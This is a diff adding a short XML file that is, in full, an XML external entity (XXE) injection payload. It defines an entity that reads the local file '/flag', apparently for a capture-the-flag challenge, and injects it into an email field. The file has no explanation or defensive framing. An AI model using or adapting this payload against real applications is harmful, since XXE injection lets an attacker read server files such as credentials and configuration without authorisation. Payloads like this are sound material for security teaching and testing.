@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!DOCTYPE demo [
+	<!ENTITY xxe SYSTEM "file:///flag">
+]>
+<root>
+	<name>
+		1
+	</name>
+	<email>
+		&xxe;
+	</email>
+</root>
